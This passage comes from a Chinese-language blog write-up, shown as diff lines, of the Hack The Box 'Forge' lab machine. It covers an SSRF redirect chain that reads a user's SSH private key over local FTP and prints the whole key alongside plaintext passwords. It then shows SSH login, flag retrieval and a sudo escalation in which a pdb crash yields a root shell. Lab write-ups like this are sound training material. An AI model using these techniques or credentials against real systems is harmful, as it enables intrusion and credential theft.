class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>20、查看下请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl http://forge.htb/uploads/mLyuNrvfVuk1JannEoWN                            <br>drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap<br>-rw-r-----    1 0        1000           33 Jan 26 06:47 user.txt<br></code></pre></td></tr></table></figure>
+
+<p>21、根据这里的情况，我们初步判断这里可能是某个用户的根目录，那是否可以直接读取到.ssh的秘钥信息？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ vim response-301<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">cat</span> response-301<br>HTTP/1.1 301 Moved Permanently<br>Date: Fri, 26 Jan 2024 06:56:12 GMT<br>Server: Apache/2.4.41 (Ubuntu)<br>Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 80 &lt; response-301<br>listening on [any] 80 ...<br>connect to [10.10.14.6] from (UNKNOWN) [10.10.11.111] 52232<br>GET / HTTP/1.1<br>Host: 10.10.14.6<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: keep-alive<br><br>^C<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -X POST -d <span class="hljs-string">&#x27;url=http%3A%2F%2F10.10.14.6&amp;remote=1&#x27;</span> http://forge.htb/upload   <br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;Upload an image&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body onload=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;/static/css/main.css&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;/static/css/upload.css&quot;</span>&gt;<br>    &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/static/js/main.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;header&gt;<br>            &lt;nav&gt;<br>                &lt;h1 class=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;/&quot;</span>&gt;Gallery&lt;/a&gt;&lt;/h1&gt;<br>                &lt;h1 class=<span class="hljs-string">&quot;align-right&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;/upload&quot;</span>&gt;Upload an image&lt;/a&gt;&lt;/h1&gt;<br>            &lt;/nav&gt;<br>    &lt;/header&gt;<br>    &lt;center&gt;<br>        &lt;br&gt;&lt;br&gt;<br>        &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;<br>            &lt;h2 onclick=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;<br>                Upload <span class="hljs-built_in">local</span> file<br>            &lt;/h2&gt;<br>            &lt;h2 onclick=<span class="hljs-string">&quot;show_upload_remote_file()&quot;</span>&gt;<br>                Upload from url<br>            &lt;/h2&gt;<br>            &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;<br>                <br>            &lt;/div&gt;<br>        &lt;/div&gt;<br>    &lt;/center&gt;<br>    &lt;br&gt;<br>    &lt;br&gt;<br>    &lt;h1&gt;<br>        &lt;center&gt;<br>            &lt;strong&gt;File uploaded successfully to the following url:&lt;/strong&gt;<br>        &lt;/center&gt;<br>    &lt;/h1&gt;<br>    &lt;h1&gt;        <br>        &lt;center&gt;<br>            &lt;strong&gt;&lt;a href=<span class="hljs-string">&quot;http://forge.htb/uploads/R0byGNI2PdFhYlX6AjTD&quot;</span>&gt;http://forge.htb/uploads/R0byGNI2PdFhYlX6AjTD&lt;/strong&gt;<br>        &lt;/center&gt;<br>    &lt;/h1&gt;<br>&lt;/body&gt;<br>&lt;/html&gt; <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl http://forge.htb/uploads/R0byGNI2PdFhYlX6AjTD                            <br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3<br>rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE<br>7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk<br>r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D<br>WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G<br>mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR<br>GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD<br>K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2<br>EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d<br>aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2<br>GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG<br>K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6<br>dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y<br>JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu<br>MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF<br>DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r<br>rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU<br>xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0<br>2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98<br>yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+<br>kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/<br>wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu<br>DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA<br>wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM<br>0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf<br>FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg<br>NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC<br>9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P<br>fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ<br>dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr<br>W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL<br>wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb<br>RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb<br>nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2<br>shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>22、可以看到是成功的获取到了秘钥信息，我们下载下这个文件，并生成本地的秘钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl http://forge.htb/uploads/R0byGNI2PdFhYlX6AjTD -o id_rsa                  <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100  2590  100  2590    0     0   2044      0  0:00:01  0:00:01 --:--:--  2047<br></code></pre></td></tr></table></figure>
+
+<p>23、给文件增加下权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">chmod</span> 600 id_rsa <br></code></pre></td></tr></table></figure>
+
+<p>24、我们开始ssh登录下靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh -i id_rsa user@10.10.11.111<br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Fri 26 Jan 2024 07:21:15 AM UTC<br><br>  System load:           0.0<br>  Usage of /:            43.8% of 6.82GB<br>  Memory usage:          21%<br>  Swap usage:            0%<br>  Processes:             222<br>  Users logged <span class="hljs-keyword">in</span>:       0<br>  IPv4 address <span class="hljs-keyword">for</span> eth0: 10.10.11.111<br>  IPv6 address <span class="hljs-keyword">for</span> eth0: dead:beef::250:56ff:feb9:2bd1<br><br><br>0 updates can be applied immediately.<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6<br>user@forge:~$ <br></code></pre></td></tr></table></figure>
+
+<p>25、那就读取下第一个flag信息吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@forge:~$ <span class="hljs-built_in">id</span><br>uid=1000(user) gid=1000(user) <span class="hljs-built_in">groups</span>=1000(user)<br>user@forge:~$ <span class="hljs-built_in">ls</span><br>snap  user.txt<br>user@forge:~$ <span class="hljs-built_in">cat</span> user.txt <br>758819b7fe569e0c14f21ee150651668<br>user@forge:~$ <br></code></pre></td></tr></table></figure>
+
+<p><strong>注：以上的利用过程总结下</strong></p>
+<p><code>我提交 http://10.10.14.6/3?f=.ssh/ 作为 /upload on forge.htb 的 URL。</code></p>
+<p><code>筛选器检查并批准 URL。</code></p>
+<p><code>forge.htb 来自 Flask 的请求 /3?.f=.ssh/ 。</code></p>
+<p><code>Flask 返回 302 重定向到 http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/ 。这将发送到 forge.htb /upload on admin.forge.htb ，它可以处理 FTP，带有 get 参数连接到本地 FTP 服务器，</code></p>
+<p><code>admin.forge.htb 从 FTP 请求 /.ssh/ 目录列表。</code></p>
+<p><code>FTP 返回结果，通过 admin.forge.htb 结果将它们返回到 forge.htb 。</code></p>
+<p><code>forge.htb 使用随机名称将结果保存在 /uploads 目录中。</code></p>
+<p><code>该已保存文件的 URL 将返回给我。</code></p>
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>26、查看下sudo权限情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@forge:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> user on forge:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User user may run the following commands on forge:<br>    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py<br>user@forge:~$ <br></code></pre></td></tr></table></figure>
+
+<p>27、这里发现了是一个运行py文件的命令，那查看下这个py文件吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@forge:~$ <br>user@forge:~$ <span class="hljs-built_in">ls</span> -la /opt/remote-manage.py<br>-rwxr-xr-x 1 root root 1447 May 31  2021 /opt/remote-manage.py<br>user@forge:~$ <span class="hljs-built_in">cat</span> /opt/remote-manage.py<br><span class="hljs-comment">#!/usr/bin/env python3</span><br>import socket<br>import random<br>import subprocess<br>import pdb<br><br>port = random.randint(1025, 65535)<br><br>try:<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)<br>    sock.bind((&#x27;<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>&#x27;, port))<br>    sock.listen(1)<br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;Listening on localhost:&#123;port&#125;&#x27;</span>)<br>    (clientsock, addr) = sock.accept()<br>    clientsock.send(b<span class="hljs-string">&#x27;Enter the secret passsword: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> clientsock.recv(1024).strip().decode() != <span class="hljs-string">&#x27;secretadminpassword&#x27;</span>:<br>        clientsock.send(b<span class="hljs-string">&#x27;Wrong password!\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        clientsock.send(b<span class="hljs-string">&#x27;Welcome admin!\n&#x27;</span>)<br>        <span class="hljs-keyword">while</span> True:<br>            clientsock.send(b<span class="hljs-string">&#x27;\nWhat do you wanna do: \n&#x27;</span>)<br>            clientsock.send(b<span class="hljs-string">&#x27;[1] View processes\n&#x27;</span>)<br>            clientsock.send(b<span class="hljs-string">&#x27;[2] View free memory\n&#x27;</span>)<br>            clientsock.send(b<span class="hljs-string">&#x27;[3] View listening sockets\n&#x27;</span>)<br>            clientsock.send(b<span class="hljs-string">&#x27;[4] Quit\n&#x27;</span>)<br>            option = int(clientsock.recv(1024).strip())<br>            <span class="hljs-keyword">if</span> option == 1:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;ps aux&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == 2:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;df&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == 3:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;ss -lnt&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == 4:<br>                clientsock.send(b<span class="hljs-string">&#x27;Bye\n&#x27;</span>)<br>                <span class="hljs-built_in">break</span><br>except Exception as e:<br>    <span class="hljs-built_in">print</span>(e)<br>    pdb.post_mortem(e.__traceback__)<br>finally:<br>    quit()<br>user@forge:~$ <br></code></pre></td></tr></table></figure>
+
+<p>28、这里发现是第一个端口监听的，如果输入正确的密码，就会进入服务，如果报错的话，就会进入到Python的shell的环境中，接下来就能获取到最终的flag信息了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py<br>Listening on localhost:55021<br>invalid literal <span class="hljs-keyword">for</span> int() with base 10: b<span class="hljs-string">&#x27;shiyan&#x27;</span><br>&gt; /opt/remote-manage.py(27)&lt;module&gt;()<br>-&gt; option = int(clientsock.recv(1024).strip())<br>(Pdb) import os<br>(Pdb) os.system(<span class="hljs-string">&#x27;bash&#x27;</span>)<br>root@forge:/home/user<span class="hljs-comment"># </span><br>root@forge:/home/user<span class="hljs-comment"># cd /root/</span><br>root@forge:~<span class="hljs-comment"># ls</span><br>clean-uploads.sh  root.txt  snap<br>root@forge:~<span class="hljs-comment"># cat root.txt</span><br>afe109870ab64a4c1fd94f6a45f5f2b5<br>root@forge:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/376</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Forge-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/23/Forge-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/28/Shibboleth-htb-writeup/" title="Shibboleth-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Shibboleth-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/21/Seal-htb-writeup/" title="Seal-htb-writeup">
+                        <span class="hidden-mobile">Seal-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
